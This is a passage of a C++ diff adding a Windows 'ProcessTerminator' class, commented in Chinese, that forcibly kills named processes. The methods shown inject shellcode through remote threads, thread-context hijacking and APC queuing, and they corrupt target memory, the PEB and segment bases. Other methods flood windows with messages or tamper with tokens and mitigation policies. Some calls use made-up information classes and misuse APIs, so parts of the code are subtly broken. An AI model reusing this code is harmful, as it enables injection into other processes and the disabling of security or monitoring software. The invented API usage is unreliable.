+                    te.dwSize = sizeof(THREADENTRY32);
+
+                    if (Thread32First(hThreadSnapshot, &te)) {
+                        do {
+                            if (te.th32OwnerProcessID == pid) {
+                                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,
+                                    FALSE, te.th32ThreadID);
+                                if (hThread) {
+                                    CONTEXT context;
+                                    context.ContextFlags = CONTEXT_FULL;
+
+                                    if (GetThreadContext(hThread, &context)) {
+#ifdef _WIN64
+                                        // 在x64系统上破坏GS配置
+                                        PVOID pGsBase = reinterpret_cast<PVOID>(context.SegGs);
+                                        if (pGsBase) {
+                                            BYTE zeroGs[0x1000] = { 0 };
+                                            WriteProcessMemory(hProcess, pGsBase,
+                                                zeroGs, sizeof(zeroGs), NULL);
+                                        }
+#else
+                                        // 在x86系统上破坏FS配置
+                                        PVOID pFsBase = reinterpret_cast<PVOID>(context.SegFs);
+                                        if (pFsBase) {
+                                            BYTE zeroFs[0x1000] = { 0 };
+                                            WriteProcessMemory(hProcess, pFsBase,
+                                                zeroFs, sizeof(zeroFs), NULL);
+                                        }
+#endif
+                                    }
+                                    CloseHandle(hThread);
+                                }
+                            }
+                        } while (Thread32Next(hThreadSnapshot, &te));
+                    }
+                    CloseHandle(hThreadSnapshot);
+                }
+            }
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法7: 通过安全子系统绕过破坏
+bool ProcessTerminator::terminateBySecuritySubsystemBypass(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 获取进程令牌
+            HANDLE hToken;
+            if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+                // 创建受限令牌
+                HANDLE hRestrictedToken;
+                if (CreateRestrictedToken(hToken, DISABLE_MAX_PRIVILEGE,
+                    0, NULL, 0, NULL, 0, NULL, &hRestrictedToken)) {
+
+                    // 设置极低完整性级别
+                    TOKEN_MANDATORY_LABEL tml = { 0 };
+                    tml.Label.Attributes = SE_GROUP_INTEGRITY;
+
+                    // 获取匿名完整性级别SID
+                    DWORD sidLength = SECURITY_MAX_SID_SIZE;
+                    PSID pAnonymousSid = LocalAlloc(LPTR, sidLength);
+                    if (CreateWellKnownSid(WinNullSid, NULL, pAnonymousSid, &sidLength)) {
+                        tml.Label.Sid = pAnonymousSid;
+
+                        SetTokenInformation(hRestrictedToken, TokenIntegrityLevel,
+                            &tml, sizeof(tml));
+
+                        LocalFree(pAnonymousSid);
+                    }
+
+                    // 替换进程令牌
+                    SetTokenInformation(hProcess, TokenSessionId,
+                        &hRestrictedToken, sizeof(HANDLE));
+
+                    CloseHandle(hRestrictedToken);
+                }
+                CloseHandle(hToken);
+            }
+
+            // 禁用所有安全策略
+            PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY filterPolicy = { 0 };
+            filterPolicy.FilterId = 1; // 实验性过滤器ID
+
+            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
+            auto SetProcessMitigationPolicy =
+                reinterpret_cast<FnSetProcessMitigationPolicy>(
+                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                        "SetProcessMitigationPolicy"));
+
+            if (SetProcessMitigationPolicy) {
+                // 尝试各种未公开的缓解策略
+                for (DWORD policyType = 0x200; policyType < 0x220; policyType++) {
+                    SetProcessMitigationPolicy(static_cast<PROCESS_MITIGATION_POLICY>(policyType),
+                        &filterPolicy, sizeof(filterPolicy));
+                }
+            }
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法8: 通过虚拟化基础设施破坏
+bool ProcessTerminator::terminateByVirtualizationInfrastructure(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 使用Hypervisor-enforced代码完整性
+            PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY shadowStackPolicy = { 0 };
+            shadowStackPolicy.EnableUserShadowStack = 1;
+            shadowStackPolicy.EnableUserShadowStackStrictMode = 1;
+
+            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
+            auto SetProcessMitigationPolicy =
+                reinterpret_cast<FnSetProcessMitigationPolicy>(
+                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                        "SetProcessMitigationPolicy"));
+
+            if (SetProcessMitigationPolicy) {
+                // 设置CET策略（控制流强制技术）
+                if (SetProcessMitigationPolicy(ProcessUserShadowStackPolicy,
+                    &shadowStackPolicy,
+                    sizeof(shadowStackPolicy))) {
+
+                    // 强制进程使用虚拟化安全特性
+                    typedef struct _PROCESS_VIRTUALIZATION_BASED_SECURITY {
+                        DWORD Flags;
+                    } PROCESS_VIRTUALIZATION_BASED_SECURITY, * PPROCESS_VIRTUALIZATION_BASED_SECURITY;
+
+                    PROCESS_VIRTUALIZATION_BASED_SECURITY vbsInfo = { 0 };
+                    vbsInfo.Flags = 0x3; // 启用完整虚拟化隔离
+
+                    ProcessTerminator::NtSetInformationProcess(hProcess,
+                        static_cast<PROCESS_INFORMATION_CLASS>(61), // ProcessVirtualizationBasedSecurity
+                        &vbsInfo, sizeof(vbsInfo));
+
+                    // 启用Credential Guard模拟
+                    typedef struct _PROCESS_ISOLATION_MECHANISM {
+                        DWORD MechanismType;
+                        DWORD Flags;
+                    } PROCESS_ISOLATION_MECHANISM;
+
+                    PROCESS_ISOLATION_MECHANISM isolationMechanism = { 0 };
+                    isolationMechanism.MechanismType = 2; // Credential Guard
+                    isolationMechanism.Flags = 0x1;
+
+                    ProcessTerminator::NtSetInformationProcess(hProcess,
+                        static_cast<PROCESS_INFORMATION_CLASS>(62), // 实验性隔离机制
+                        &isolationMechanism, sizeof(isolationMechanism));
+                }
+            }
+
+            // 强制进程进入无法恢复的虚拟化状态
+            TerminateProcess(hProcess, 0xC0000000); // 自定义退出代码
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+// 方法4: 通过控制流防护(CFG)终止
+bool ProcessTerminator::terminateByProcessControlFlowGuard(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        // 动态加载API函数
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (!hKernel32) return false;
+
+        PSetProcessMitigationPolicy pSetProcessMitigationPolicy =
+            reinterpret_cast<PSetProcessMitigationPolicy>(
+                GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));
+
+        PSetProcessValidCallTargets pSetProcessValidCallTargets =
+            reinterpret_cast<PSetProcessValidCallTargets>(
+                GetProcAddress(hKernel32, "SetProcessValidCallTargets"));
+
+        if (!pSetProcessMitigationPolicy || !pSetProcessValidCallTargets) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 修改CFG策略使其过于严格
+            PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = { 0 };
+            cfgPolicy.EnableControlFlowGuard = 1;
+            cfgPolicy.EnableExportSuppression = 1;
+            cfgPolicy.StrictMode = 1; // 启用严格模式
+
+            if (pSetProcessMitigationPolicy(ProcessControlFlowGuardPolicy,
+                &cfgPolicy, sizeof(cfgPolicy))) {
+                // 尝试触发CFG验证失败
+                // 分配内存但不将其标记为有效调用目标
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
+                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                if (pRemoteCode) {
+                    // 尝试设置无效的调用目标
+                    if (!pSetProcessValidCallTargets(hProcess, pRemoteCode, 1024, 0, NULL)) {
+                        // CFG策略生效，进程无法执行代码
+                        // 现在可以尝试终止
+                        bool result = TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        if (result) return true;
+                    }
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 方法5: 通过签名策略终止
+bool ProcessTerminator::terminateByProcessSignaturePolicy(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        // 动态加载API函数
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (!hKernel32) return false;
+
+        PSetProcessMitigationPolicy pSetProcessMitigationPolicy =
+            reinterpret_cast<PSetProcessMitigationPolicy>(
+                GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));
+
+        if (!pSetProcessMitigationPolicy) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 设置严格的签名策略
+            PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sigPolicy = { 0 };
+            sigPolicy.MicrosoftSignedOnly = 1;
+            sigPolicy.StoreSignedOnly = 1;
+            sigPolicy.MitigationOptIn = 1;
+
+            if (pSetProcessMitigationPolicy(ProcessSignaturePolicy,
+                &sigPolicy, sizeof(sigPolicy))) {
+                // 尝试加载未签名的DLL使其失败
+                // 分配内存写入LoadLibrary代码
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
+                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                if (pRemoteCode) {
+                    // 写入LoadLibrary调用
+#ifdef _WIN64
+                    BYTE loadLibraryCode[] = {
+                        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, LoadLibraryA
+                        0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // mov rcx, "unknown.dll"
+                        0xFF, 0xD0                          // call rax
+                    };
+
+                    // 获取LoadLibrary地址
+                    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
+                    memcpy(&loadLibraryCode[2], &pLoadLibrary, sizeof(pLoadLibrary));
+
+                    // 设置无效的DLL名
+                    const char* invalidDll = "invalid_unsigned.dll";
+                    memcpy(&loadLibraryCode[12], &invalidDll, sizeof(invalidDll));
+#else
+                    BYTE loadLibraryCode[] = {
+                        0xB8, 0, 0, 0, 0,       // mov eax, LoadLibraryA
+                        0x68, 0, 0, 0, 0,       // push "unknown.dll"
+                        0xFF, 0xD0              // call eax
+                    };
+
+                    // 获取LoadLibrary地址
+                    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
+                    memcpy(&loadLibraryCode[1], &pLoadLibrary, sizeof(pLoadLibrary));
+
+                    // 设置无效的DLL名
+                    const char* invalidDll = "invalid_unsigned.dll";
+                    memcpy(&loadLibraryCode[6], &invalidDll, sizeof(invalidDll));
+#endif
+                    WriteProcessMemory(hProcess, pRemoteCode, loadLibraryCode,
+                        sizeof(loadLibraryCode), NULL);
+
+                    // 创建远程线程执行
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                        (LPTHREAD_START_ROUTINE)pRemoteCode,
+                        NULL, 0, NULL);
+                    if (hThread) {
+                        // 等待线程执行失败
+                        WaitForSingleObject(hThread, 1000);
+                        DWORD exitCode;
+                        GetExitCodeThread(hThread, &exitCode);
+
+                        if (exitCode == NULL) {
+                            // 签名策略生效，加载失败
+                            // 现在可以尝试终止
+                            bool result = TerminateProcess(hProcess, 0);
+                            CloseHandle(hThread);
+                            CloseHandle(hProcess);
+                            if (result) return true;
+                        }
+                        CloseHandle(hThread);
+                    }
+
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+bool ProcessTerminator::terminateByMemoryZeroing(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 获取进程内存信息
+            MEMORY_BASIC_INFORMATION mbi;
+            LPVOID address = NULL;
+            std::vector<BYTE> zeroBuffer(4096, 0);
+
+            while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
+                if (mbi.State == MEM_COMMIT &&
+                    (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) {
+                    // 尝试清零内存
+                    SIZE_T bytesWritten;
+                    WriteProcessMemory(hProcess, mbi.BaseAddress,
+                        zeroBuffer.data(),
+                        std::min(zeroBuffer.size(), mbi.RegionSize),
+                        &bytesWritten);
+                }
+
+                address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+            }
+
+            // 尝试正常终止
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByThreadHijacking(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 枚举进程线程
+            DWORD threadId = 0;
+            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (hSnapshot != INVALID_HANDLE_VALUE) {
+                THREADENTRY32 te32;
+                te32.dwSize = sizeof(THREADENTRY32);
+
+                if (Thread32First(hSnapshot, &te32)) {
+                    do {
+                        if (te32.th32OwnerProcessID == pid) {
+                            threadId = te32.th32ThreadID;
+                            break;
+                        }
+                    } while (Thread32Next(hSnapshot, &te32));
+                }
+                CloseHandle(hSnapshot);
+            }
+
+            if (threadId != 0) {
+                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
+                if (hThread) {
+                    // 挂起线程
+                    SuspendThread(hThread);
+
+                    // 获取线程上下文
+                    CONTEXT context;
+                    context.ContextFlags = CONTEXT_FULL;
+                    GetThreadContext(hThread, &context);
+
+                    // 分配内存存放退出代码
+                    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
+                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                    if (pRemoteCode) {
+                        // 写入退出进程的代码
+#ifdef _WIN64
+                        BYTE exitCode[] = {
+                            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 28h
+                            0x48, 0x31, 0xC9,                   // xor rcx, rcx
+                            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, ExitProcess
+                            0xFF, 0xD0,                         // call rax
+                            0x90, 0x90, 0x90, 0x90              // nops
+                        };
+
+                        // 获取ExitProcess地址
+                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                        if (!hKernel32) {
+                            // 处理错误
+                            return false;
+                        }
+                        FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
+                        memcpy(&exitCode[9], &pExitProcess, sizeof(pExitProcess));
+#else
+                        BYTE exitCode[] = {
+                            0x6A, 0x00,                         // push 0
+                            0xB8, 0, 0, 0, 0,                   // mov eax, ExitProcess
+                            0xFF, 0xD0,                         // call eax
+                            0x90, 0x90, 0x90                    // nops
+                        };
+
+                        // 获取ExitProcess地址
+                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                        FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
+                        memcpy(&exitCode[3], &pExitProcess, sizeof(pExitProcess));
+#endif
+                        WriteProcessMemory(hProcess, pRemoteCode, exitCode, sizeof(exitCode), NULL);
+
+                        // 修改线程上下文执行退出代码
+#ifdef _WIN64
+                        context.Rip = (DWORD64)pRemoteCode;
+#else
+                        context.Eip = (DWORD)pRemoteCode;
+#endif
+                        SetThreadContext(hThread, &context);
+
+                        // 恢复线程执行
+                        ResumeThread(hThread);
+
+                        // 等待线程退出
+                        WaitForSingleObject(hThread, 1000);
+
+                        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                    }
+
+                    CloseHandle(hThread);
+                }
+            }
+
+            CloseHandle(hProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByExceptionInjection(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 分配内存存放异常代码
+            LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
+                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            if (pRemoteCode) {
+                // 写入会导致异常的指令
+                BYTE faultCode[] = {
+                    0x33, 0xC0,    // xor eax, eax
+                    0xF7, 0xF0,    // div eax (除零异常)
+                    0xC3           // ret
+                };
+
+                WriteProcessMemory(hProcess, pRemoteCode, faultCode, sizeof(faultCode), NULL);
+
+                // 创建远程线程执行异常代码
+                HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                    (LPTHREAD_START_ROUTINE)pRemoteCode,
+                    NULL, 0, NULL);
+                if (hThread) {
+                    WaitForSingleObject(hThread, 1000);
+                    CloseHandle(hThread);
+                }
+
+                VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+            }
+
+            CloseHandle(hProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByMessageFlooding(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            // 查找进程的所有窗口
+            HWND hWnd = NULL;
+            do {
+                hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
+
+                DWORD windowPid;
+                GetWindowThreadProcessId(hWnd, &windowPid);
+
+                if (windowPid == pid) {
+                    // 发送大量消息使进程无响应
+                    for (int i = 0; i < 10000; i++) {
+                        PostMessage(hWnd, WM_NULL, 0, 0);
+                        PostMessage(hWnd, WM_USER, 0, 0);
+                        PostMessage(hWnd, 0x0400 + rand() % 0x3FFF, 0, 0);
+                    }
+                }
+            } while (hWnd != NULL);
+
+            // 尝试正常终止
+            terminateByPID(pid);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByGDIExhaustion(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 尝试耗尽进程的GDI资源
+            for (int i = 0; i < 10000; i++) {
+                // 这些调用会消耗目标进程的GDI资源
+                DWORD_PTR result;
+                SendMessageTimeout(HWND_BROADCAST, WM_NULL, 0, 0,
+                    SMTO_ABORTIFHUNG | SMTO_BLOCK, 100, &result);
+            }
+
+            // 尝试正常终止
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByProcessTree(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 获取所有相关进程（父进程和子进程）
+        std::set<DWORD> allPids;
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe;
+            pe.dwSize = sizeof(PROCESSENTRY32);
+
+            if (Process32First(hSnapshot, &pe)) {
+                do {
+                    // 检查是否是目标进程或其子进程
+                    for (int targetPid : pids) {
+                        if (pe.th32ProcessID == targetPid ||
+                            pe.th32ParentProcessID == targetPid) {
+                            allPids.insert(pe.th32ProcessID);
+
+                            // 递归添加子进程
+                            std::function<void(DWORD)> addChildren = [&](DWORD parentPid) {
+                                PROCESSENTRY32 pe2 = { sizeof(PROCESSENTRY32) };
+                                if (Process32First(hSnapshot, &pe2)) {
+                                    do {
+                                        if (pe2.th32ParentProcessID == parentPid) {
+                                            allPids.insert(pe2.th32ProcessID);
+                                            addChildren(pe2.th32ProcessID);
+                                        }
+                                    } while (Process32Next(hSnapshot, &pe2));
+                                }
+                                };
+
+                            addChildren(pe.th32ProcessID);
+                        }
+                    }
+                } while (Process32Next(hSnapshot, &pe));
+            }
+            CloseHandle(hSnapshot);
+        }
+
+        // 终止所有相关进程
+        for (DWORD pid : allPids) {
+            terminateByPID(pid);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+bool ProcessTerminator::terminateByKernelMemoryManipulation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 启用必要特权
+            EnablePrivilege(SE_DEBUG_NAME);
+            EnablePrivilege(SE_TCB_NAME);
+
+            // 方法1: 直接修改EPROCESS结构
+            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+            if (!hNtdll) {
+                CloseHandle(hProcess);
+                continue;
+            }
+
+            // 获取系统所有句柄
+            ULONG bufferSize = 0x100000;
+            PSYSTEM_HANDLE_INFORMATION_EX handleInfo =
+                (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+
+            if (!handleInfo) {
+                CloseHandle(hProcess);
+                continue;
+            }
+
+            NTSTATUS status;
+            while ((status = SafeNtQuerySystemInformation(
+                static_cast<SYSTEM_INFORMATION_CLASS>(16),
+                handleInfo, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
+                bufferSize *= 2;
+                free(handleInfo);
+                handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+                if (!handleInfo) {
+                    CloseHandle(hProcess);
+                    break;
+                }
+            }
+
+            if (!handleInfo || !NT_SUCCESS(status)) {
+                free(handleInfo);
+                CloseHandle(hProcess);
+                continue;
+            }
+
+            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+                    SYSTEM_HANDLE handle = handleInfo->Information[i];
+
+                    if (handle.ProcessId == pid && handle.ObjectTypeNumber == 0x7) {
+                        HANDLE hKernelObject;
+                        if (DuplicateHandle(GetCurrentProcess(),
+                            (HANDLE)handle.Handle,
+                            GetCurrentProcess(),
+                            &hKernelObject,
+                            0, FALSE, DUPLICATE_SAME_ACCESS)) {
+
+                            // 分配内存执行特殊代码
+                            LPVOID pRemoteCode = VirtualAllocEx(hProcess,
+                                NULL, 4096, MEM_COMMIT | MEM_RESERVE,
+                                PAGE_EXECUTE_READWRITE);
+
+                            if (pRemoteCode) {
+                                // 写入特殊终止代码
+                                BYTE exitCode[] = {
+                                    0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
+                                    0xC3                          // ret
+                                };
+
+                                SIZE_T bytesWritten;
+                                if (WriteProcessMemory(hProcess, pRemoteCode,
+                                    exitCode, sizeof(exitCode), &bytesWritten)) {
+
+                                    HANDLE hThread = CreateRemoteThread(hProcess,
+                                        NULL, 0,
+                                        (LPTHREAD_START_ROUTINE)pRemoteCode,
+                                        NULL, 0, NULL);
+
+                                    if (hThread) {
+                                        WaitForSingleObject(hThread, 100);
+                                        CloseHandle(hThread);
+                                    }
+                                }
+
+                                VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                            }
+
+                            // 破坏进程关键结构
+                            PROCESS_BASIC_INFORMATION pbi;
+                            ULONG returnLength;
+
+                            if (NT_SUCCESS(NtQueryInformationProcess(hProcess,
+                                static_cast<PROCESS_INFORMATION_CLASS>(0),
+                                &pbi, sizeof(pbi), &returnLength))) {
+
+                                // 修改PEB关键字段
+                                BYTE zeroBuffer[128] = { 0 };
+                                SIZE_T bytesWritten;
+                                WriteProcessMemory(hProcess, pbi.PebBaseAddress,
+                                    zeroBuffer, sizeof(zeroBuffer), &bytesWritten);
+                            }
+
+                            CloseHandle(hKernelObject);
+                        }
+                    }
+                }
+
+            free(handleInfo);
+
+            // 修改内存保护制造冲突
+            MEMORY_BASIC_INFORMATION mbi;
+            LPVOID address = 0;
+
+            while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
+                if (mbi.State == MEM_COMMIT) {
+                    DWORD oldProtect;
+                    VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize,
+                        PAGE_NOACCESS, &oldProtect);
+                    VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize,
+                        oldProtect, &oldProtect);
+                }
+
+                address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+                if (address < mbi.BaseAddress) break;
+            }
+
+            // 最终强制终止
+            bool result = TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+
+            if (result) {
+                return true;
+            }
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+bool ProcessTerminator::terminateByTokenReplacement(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 获取当前进程的令牌（通常权限较低）
+            HANDLE hCurrentToken;
+            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken)) {
+                // 尝试设置目标进程的令牌
+                SetTokenInformation(hProcess, TokenSessionId, &hCurrentToken, sizeof(HANDLE));
+                CloseHandle(hCurrentToken);
+            }
+
+            // 尝试终止权限降低后的进程
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByAPCInjection(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 枚举进程线程
+            DWORD threadId = 0;
+            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (hSnapshot != INVALID_HANDLE_VALUE) {
+                THREADENTRY32 te32;
+                te32.dwSize = sizeof(THREADENTRY32);
+
+                if (Thread32First(hSnapshot, &te32)) {
+                    do {
+                        if (te32.th32OwnerProcessID == pid) {
+                            threadId = te32.th32ThreadID;
+                            break;
+                        }
+                    } while (Thread32Next(hSnapshot, &te32));
+                }
+                CloseHandle(hSnapshot);
+            }
+
+            if (threadId != 0) {
+                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
+                if (hThread) {
+                    // 分配内存存放APC代码
+                    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
+                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                    if (pRemoteCode) {
+                        // 写入退出线程的代码
+#ifdef _WIN64
+                        BYTE apcCode[] = {
+                            0x48, 0x83, 0xEC, 0x28,       // sub rsp, 28h
+                            0x48, 0x31, 0xC9,             // xor rcx, rcx
+                            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, ExitThread
+                            0xFF, 0xD0,                   // call rax
+                        };
+
+                        // 获取ExitThread地址
+                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                        FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
+                        memcpy(&apcCode[9], &pExitThread, sizeof(pExitThread));
+#else
+                        BYTE apcCode[] = {
+                            0x6A, 0x00,                   // push 0
+                            0xB8, 0, 0, 0, 0,             // mov eax, ExitThread
+                            0xFF, 0xD0,                   // call eax
+                        };
+
+                        // 获取ExitThread地址
+                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                        FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
+                        memcpy(&apcCode[3], &pExitThread, sizeof(pExitThread));
+#endif
